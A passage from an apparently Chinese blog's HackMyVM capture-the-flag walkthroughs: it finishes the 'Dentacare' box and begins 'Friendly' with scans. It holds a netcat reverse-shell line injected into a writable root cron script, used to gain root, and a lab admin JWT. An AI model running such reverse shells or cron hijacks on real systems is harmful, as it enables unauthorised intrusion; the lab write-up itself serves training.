<span class="token comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="token comment"># |  |  |  |  |</span>
<span class="token comment"># *  *  *  *  * user-name command to be executed</span>
<span class="token number">17</span> *    * * *   root    <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.hourly
<span class="token number">25</span> <span class="token number">6</span>    * * *   root    <span class="token builtin class-name">test</span> <span class="token parameter variable">-x</span> /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">&#123;</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.daily<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token number">47</span> <span class="token number">6</span>    * * <span class="token number">7</span>   root    <span class="token builtin class-name">test</span> <span class="token parameter variable">-x</span> /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">&#123;</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.weekly<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token number">52</span> <span class="token number">6</span>    <span class="token number">1</span> * *   root    <span class="token builtin class-name">test</span> <span class="token parameter variable">-x</span> /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">&#123;</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.monthly<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre>
<p>传pspy64看一下有没有定时任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2024</span>/06/02 <span class="token number">17</span>:22:29 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">33</span>   <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1164</span>   <span class="token operator">|</span> /usr/sbin/apache2 <span class="token parameter variable">-k</span> start 
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:22:29 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">11</span>     <span class="token operator">|</span> 
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:22:29 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">33</span>   <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1021</span>   <span class="token operator">|</span> /usr/sbin/apache2 <span class="token parameter variable">-k</span> start 
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:22:29 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">10</span>     <span class="token operator">|</span> 
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:22:29 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1</span>      <span class="token operator">|</span> /sbin/init 
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46925</span>  <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46926</span>  <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46927</span>  <span class="token operator">|</span> /bin/sh <span class="token parameter variable">-c</span> /usr/bin/node /opt/appli/.config/read_comment.js 
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46938</span>  <span class="token operator">|</span> /usr/bin/node /opt/appli/.config/read_comment.js 
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46940</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome --allow-pre-commit-input --disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-field-trial-config --disable-hang-monitor --disable-infobars --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-search-engine-choice-screen --disable-sync --enable-automation --export-tagged-pdf --generate-pdf-document-outline --force-color-profile<span class="token operator">=</span>srgb --metrics-recording-only --no-first-run --password-store<span class="token operator">=</span>basic --use-mock-keychain --disable-features<span class="token operator">=</span>Translate,AcceptCHFrame,MediaRouter,OptimizationHints,ProcessPerSiteUpToMainFrameThreshold --enable-features<span class="token operator">=</span>NetworkServiceInProcess2 <span class="token parameter variable">--headless</span><span class="token operator">=</span>new --hide-scrollbars --mute-audio about:blank --no-sandbox --disable-setuid-sandbox --remote-debugging-port<span class="token operator">=</span><span class="token number">0</span> --user-data-dir<span class="token operator">=</span>/tmp/puppeteer_dev_chrome_profile-vdJpDa                                                                                                                                                                                  
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46939</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome --allow-pre-commit-input --disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-field-trial-config --disable-hang-monitor --disable-infobars --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-search-engine-choice-screen --disable-sync --enable-automation --export-tagged-pdf --generate-pdf-document-outline --force-color-profile<span class="token operator">=</span>srgb --metrics-recording-only --no-first-run --password-store<span class="token operator">=</span>basic --use-mock-keychain --disable-features<span class="token operator">=</span>Translate,AcceptCHFrame,MediaRouter,OptimizationHints,ProcessPerSiteUpToMainFrameThreshold --enable-features<span class="token operator">=</span>NetworkServiceInProcess2 <span class="token parameter variable">--headless</span><span class="token operator">=</span>new --hide-scrollbars --mute-audio about:blank --no-sandbox --disable-setuid-sandbox --remote-debugging-port<span class="token operator">=</span><span class="token number">0</span> --user-data-dir<span class="token operator">=</span>/tmp/puppeteer_dev_chrome_profile-vdJpDa                                                                                                                                                                                  
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46942</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome_crashpad_handler --monitor-self --monitor-self-annotation<span class="token operator">=</span>ptype<span class="token operator">=</span>crashpad-handler <span class="token parameter variable">--database</span><span class="token operator">=</span>/root/.config/google-chrome-for-testing/Crash Reports <span class="token parameter variable">--annotation</span><span class="token operator">=</span>lsb-release<span class="token operator">=</span>Debian GNU/Linux <span class="token number">12</span> <span class="token punctuation">(</span>bookworm<span class="token punctuation">)</span> <span class="token parameter variable">--annotation</span><span class="token operator">=</span>plat<span class="token operator">=</span>Linux <span class="token parameter variable">--annotation</span><span class="token operator">=</span>prod<span class="token operator">=</span>Chrome_Linux <span class="token parameter variable">--annotation</span><span class="token operator">=</span>ver<span class="token operator">=</span><span class="token number">123.0</span>.6312.105 --initial-client-fd<span class="token operator">=</span><span class="token number">5</span> --shared-client-connection         
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46941</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome_crashpad_handler --monitor-self --monitor-self-annotation<span class="token operator">=</span>ptype<span class="token operator">=</span>crashpad-handler <span class="token parameter variable">--database</span><span class="token operator">=</span>/root/.config/google-chrome-for-testing/Crash Reports <span class="token parameter variable">--annotation</span><span class="token operator">=</span>lsb-release<span class="token operator">=</span>Debian GNU/Linux <span class="token number">12</span> <span class="token punctuation">(</span>bookworm<span class="token punctuation">)</span> <span class="token parameter variable">--annotation</span><span class="token operator">=</span>plat<span class="token operator">=</span>Linux <span class="token parameter variable">--annotation</span><span class="token operator">=</span>prod<span class="token operator">=</span>Chrome_Linux <span class="token parameter variable">--annotation</span><span class="token operator">=</span>ver<span class="token operator">=</span><span class="token number">123.0</span>.6312.105 --initial-client-fd<span class="token operator">=</span><span class="token number">5</span> --shared-client-connection         
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46946</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome --allow-pre-commit-input --disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-field-trial-config --disable-hang-monitor --disable-infobars --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-search-engine-choice-screen --disable-sync --enable-automation --export-tagged-pdf --generate-pdf-document-outline --force-color-profile<span class="token operator">=</span>srgb --metrics-recording-only --no-first-run --password-store<span class="token operator">=</span>basic --use-mock-keychain --disable-features<span class="token operator">=</span>Translate,AcceptCHFrame,MediaRouter,OptimizationHints,ProcessPerSiteUpToMainFrameThreshold --enable-features<span class="token operator">=</span>NetworkServiceInProcess2 <span class="token parameter variable">--headless</span><span class="token operator">=</span>new --hide-scrollbars --mute-audio about:blank --no-sandbox --disable-setuid-sandbox --remote-debugging-port<span class="token operator">=</span><span class="token number">0</span> --user-data-dir<span class="token operator">=</span>/tmp/puppeteer_dev_chrome_profile-vdJpDa                                                                                                                                                                                  
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46945</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome --allow-pre-commit-input --disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-field-trial-config --disable-hang-monitor --disable-infobars --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-search-engine-choice-screen --disable-sync --enable-automation --export-tagged-pdf --generate-pdf-document-outline --force-color-profile<span class="token operator">=</span>srgb --metrics-recording-only --no-first-run --password-store<span class="token operator">=</span>basic --use-mock-keychain --disable-features<span class="token operator">=</span>Translate,AcceptCHFrame,MediaRouter,OptimizationHints,ProcessPerSiteUpToMainFrameThreshold --enable-features<span class="token operator">=</span>NetworkServiceInProcess2 <span class="token parameter variable">--headless</span><span class="token operator">=</span>new --hide-scrollbars --mute-audio about:blank --no-sandbox --disable-setuid-sandbox --remote-debugging-port<span class="token operator">=</span><span class="token number">0</span> --user-data-dir<span class="token operator">=</span>/tmp/puppeteer_dev_chrome_profile-vdJpDa                                                                                                                                                                                  
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46971</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome <span class="token parameter variable">--type</span><span class="token operator">=</span>gpu-process --no-sandbox --disable-dev-shm-usage --disable-breakpad <span class="token parameter variable">--headless</span><span class="token operator">=</span>new --ozone-platform<span class="token operator">=</span>headless --use-angle<span class="token operator">=</span>swiftshader-webgl --crashpad-handler-pid<span class="token operator">=</span><span class="token number">46940</span> --enable-crash-reporter<span class="token operator">=</span>, <span class="token parameter variable">--noerrdialogs</span> --user-data-dir<span class="token operator">=</span>/tmp/puppeteer_dev_chrome_profile-vdJpDa --change-stack-guard-on-fork<span class="token operator">=</span>enable --gpu-preferences<span class="token operator">=</span>WAAAAAAAAAAgAAA    
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46973</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome <span class="token parameter variable">--type</span><span class="token operator">=</span>utility --utility-sub-type<span class="token operator">=</span>storage.mojom.StorageService <span class="token parameter variable">--lang</span><span class="token operator">=</span>en-US --service-sandbox-type<span class="token operator">=</span>utility --no-sandbox --disable-dev-shm-usage --use-angle<span class="token operator">=</span>swiftshader-webgl --mute-audio --crashpad-handler-pid<span class="token operator">=</span><span class="token number">46940</span> --enable-crash-reporter<span class="token operator">=</span>, <span class="token parameter variable">--noerrdialogs</span> --user-data-dir<span class="token operator">=</span>/tmp/puppeteer_dev_chrome_profile-vdJpDa <span class="token parameter variable">--change</span>                        
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46992</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome <span class="token parameter variable">--type</span><span class="token operator">=</span>zygote --no-sandbox <span class="token parameter variable">--headless</span><span class="token operator">=</span>new --crashpad-handler-pid<span class="token operator">=</span><span class="token number">46940</span> --enable-crash-reporter<span class="token operator">=</span>, <span class="token parameter variable">--noerrdialogs</span> --user-data-dir<span class="token operator">=</span>/tmp/puppeteer_dev_chrome_profile-vdJpDa --change-stack-guard-on-fork<span class="token operator">=</span>enable --no-first-run --ozone-platform<span class="token operator">=</span>headless --ozone-override-screen-size<span class="token operator">=</span><span class="token number">800,600</span> --use-angle<span class="token operator">=</span>swiftshader-webgl                                  
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">46991</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome <span class="token parameter variable">--type</span><span class="token operator">=</span>renderer --crashpad-handler-pid<span class="token operator">=</span><span class="token number">46940</span> --enable-crash-reporter<span class="token operator">=</span>, <span class="token parameter variable">--noerrdialogs</span> --user-data-dir<span class="token operator">=</span>/tmp/puppeteer_dev_chrome_profile-vdJpDa --change-stack-guard-on-fork<span class="token operator">=</span>enable --no-sandbox --disable-dev-shm-usage --disable-background-timer-throttling --disable-breakpad --enable-automation --force-color-profile<span class="token operator">=</span>srgb --                        
<span class="token number">2024</span>/06/02 <span class="token number">17</span>:23:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">47013</span>  <span class="token operator">|</span> /root/.cache/puppeteer/chrome/linux-123.0.6312.105/chrome-linux64/chrome <span class="token parameter variable">--type</span><span class="token operator">=</span>renderer --crashpad-handler-pid<span class="token operator">=</span><span class="token number">46940</span> --enable-crash-reporter<span class="token operator">=</span>, <span class="token parameter variable">--noerrdialogs</span> --user-data-dir<span class="token operator">=</span>/tmp/puppeteer_dev_chrome_profile-vdJpDa --change-stack-guard-on-fork<span class="token operator">=</span>enable --no-sandbox --disable-dev-shm-usage --disable-background-timer-throttling --disable-breakpad --enable-automation --force-color-profile<span class="token operator">=</span>srgb --</code></pre>
<p>似乎不行，既然如此，那么我也只能上我的必杀技了，opt目录！</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@dentacare:/var/www$ <span class="token builtin class-name">cd</span> /opt
www-data@dentacare:/opt$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxr-xr-x  <span class="token number">4</span> root     root     <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root     root     <span class="token number">4096</span> Mar  <span class="token number">9</span> <span class="token number">12</span>:28 <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">7</span> www-data www-data <span class="token number">4096</span> Jun  <span class="token number">2</span> <span class="token number">17</span>:15 appli
drwxr-xr-x  <span class="token number">3</span> dentist  dentist  <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 carries
www-data@dentacare:/opt$ <span class="token builtin class-name">cd</span> appli
www-data@dentacare:/opt/appli$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">100</span>
drwxr-xr-x   <span class="token number">7</span> www-data www-data  <span class="token number">4096</span> Jun  <span class="token number">2</span> <span class="token number">17</span>:15 <span class="token builtin class-name">.</span>
drwxr-xr-x   <span class="token number">4</span> root     root      <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 <span class="token punctuation">..</span>
drwxr-xr-x   <span class="token number">2</span> www-data www-data  <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 .config
-rw-r--r--   <span class="token number">1</span> www-data www-data <span class="token number">12288</span> Jun  <span class="token number">2</span> <span class="token number">17</span>:15 DentalDB.db
-rw-r--r--   <span class="token number">1</span> www-data www-data  <span class="token number">2426</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 app.py
drwxr-xr-x   <span class="token number">5</span> www-data www-data  <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 <span class="token function">env</span>
drwxr-xr-x <span class="token number">112</span> www-data www-data <span class="token number">12288</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 node_modules
-rw-r--r--   <span class="token number">1</span> www-data www-data <span class="token number">44001</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 package-lock.json
-rw-r--r--   <span class="token number">1</span> www-data www-data    <span class="token number">55</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 package.json
drwxr-xr-x   <span class="token number">7</span> www-data www-data  <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 static
drwxr-xr-x   <span class="token number">2</span> www-data www-data  <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 templates</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@dentacare:/opt/appli/.config$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x <span class="token number">2</span> www-data www-data <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">7</span> www-data www-data <span class="token number">4096</span> Jun  <span class="token number">2</span> <span class="token number">17</span>:15 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> www-data www-data <span class="token number">1063</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 read_comment.js</code></pre>
<p>等等，有点眼熟，刚才pspy64里面也有这个js文件，而且有写的权限，UID还是0，我去</p>
<pre class="language-none"><code class="language-none">2024&#x2F;06&#x2F;02 17:23:01 CMD: UID&#x3D;0    PID&#x3D;46927  | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;bin&#x2F;node &#x2F;opt&#x2F;appli&#x2F;.config&#x2F;read_comment.js </code></pre>
<p>是个定时任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@dentacare:/opt/appli/.config$ <span class="token function">cat</span> read_comment.js
const puppeteer <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">(</span>async <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    const browser <span class="token operator">=</span> await puppeteer.launch<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        headless: true,
        args: <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span>, <span class="token string">'--disable-setuid-sandbox'</span><span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    const page <span class="token operator">=</span> await browser.newPage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    const cookies <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>
        <span class="token string">'name'</span><span class="token builtin class-name">:</span> <span class="token string">'Authorization'</span>,
        <span class="token string">'value'</span><span class="token builtin class-name">:</span> <span class="token string">'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJEZW50YUNhcmUgQ29ycG9yYXRpb24gIiwiaWF0IjoxNzEyNTc0NTEyLCJleHAiOjE3NDQxMTA1MTIsImF1ZCI6ImRlbnRhY2FyZS5obXYiLCJzdWIiOiJoZWxwZGVza0BkZW50YWNhcmUuaG12IiwiR2l2ZW5OYW1lIjoiUGF0cmljayIsIlN1cm5hbWUiOiJQZXRpdCIsIkVtYWlsIjoiYWRtaW5AZGVudGFjYXJlLmhtdiIsIlJvbGUiOlsiQWRtaW5pc3RyYXRvciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.FIMxmUCOL3a4ThN5z-7VDN8OxBK7W0krHlcVktAiZtx3KXSQsbno1q1MRUL9JMPTJeqoTr-bRL2KWyr5Kv7JnQ'</span>,
        <span class="token string">'url'</span><span class="token builtin class-name">:</span> <span class="token string">'http://localhost:80'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    await page.setCookie<span class="token punctuation">(</span><span class="token punctuation">..</span>.cookies<span class="token punctuation">)</span><span class="token punctuation">;</span>

    await page.goto<span class="token punctuation">(</span><span class="token string">'http://localhost:80/view-all-comments'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    console.log<span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>Page visitée avec cookie spécifié à $<span class="token punctuation">&#123;</span>new Date<span class="token punctuation">(</span><span class="token punctuation">)</span>.toISOString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token variable">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    await page.waitForTimeout<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    await browser.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>植入一个命令反弹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">require<span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token string">"nc -e /bin/bash 192.168.56.104 4567"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567                        </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
<span class="token parameter variable">-connect</span> to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.176<span class="token punctuation">]</span> <span class="token number">39800</span>
<span class="token function">id</span>
<span class="token function">whoami</span>
root</code></pre>
<p>rooted!</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Friendly</title>
    <url>/posts/201f4a94/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.177</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># arp-scan -l                          </span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:c6:2d:d8       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.177  08:00:27:a2:9f:c0       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.043</span> seconds <span class="token punctuation">(</span><span class="token number">125.31</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.177 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-27 <span class="token number">12</span>:51 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.177
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00036s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     ProFTPD
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-rw-r--r--   <span class="token number">1</span> root     root        <span class="token number">10725</span> Feb <span class="token number">23</span>  <span class="token number">2023</span> index.html
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.54 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.54 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:A2:9F:C0 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.37</span> ms <span class="token number">192.168</span>.56.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
